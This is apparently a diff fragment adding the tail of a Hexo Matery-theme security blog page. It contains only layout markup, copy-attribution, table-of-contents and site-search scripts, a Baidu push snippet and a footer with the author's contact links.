+                            <a href="/categories/PHP%E5%AE%89%E5%85%A8/" class="post-category">
+                                    PHP安全
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/">
+                        <span class="chip bg-color">...</span>
+                    </a>
+                    
+                    <a href="/tags/Java/">
+                        <span class="chip bg-color">Java</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('120')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + '来源: 会下雪的晴天<br />'
+            + '文章作者: yq1ng<br />'
+            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h1, h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h1, h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+    <div class="container row center-align" style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2019-2022</span>
+            
+            <span id="year">2019</span>
+            <a href="/about" target="_blank">yq1ng</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                class="white-color">189.8k</span>&nbsp;字
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/yq1ng" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:1578422748@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1578422748" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1578422748" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+<a onclick="switchNightMode()" id="sma" title="模式切换">
+    <i class="fa fa-moon-o" id="nightMode" aria-hidden="true"></i>
+</a>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+	
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
